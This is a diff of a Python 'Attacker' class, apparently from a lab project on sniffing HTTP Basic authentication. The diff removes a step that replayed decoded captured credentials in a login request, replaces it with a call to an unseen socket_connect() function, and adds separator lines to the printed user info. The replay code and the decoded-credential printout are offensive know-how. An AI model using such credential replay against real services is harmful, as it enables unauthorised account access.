@@ -1,6 +1,7 @@
 import pyshark
 import requests
 import base64
+from socket_connection import socket_connect
 
 class Attacker():
     
@@ -33,22 +34,14 @@ class Attacker():
                 
             
     def attack(self):
-        print("Attack Start...!")
-        headers = {'Authorization': f'Basic {self.encoded_info}'}
-
-        # 로그인 요청 보내기
-        response = requests.get(self.login_url, headers=headers)
-        
-        # 응답 확인
-        if response.status_code == 200:
-            print('Attacker 로그인 성공!')
-        else:
-            print('Attacker 로그인 실패...')
+        socket_connect()
             
     def print_user_info(self):
+        print("="*20)
         print(f"Decoded user info: {self.decoded_info}")
         print(f"HTTP version: {self.http_version}")
         print(f"Host name: {self.host_name}")
+        print("="*20)
 
             
 if __name__ == '__main__':       
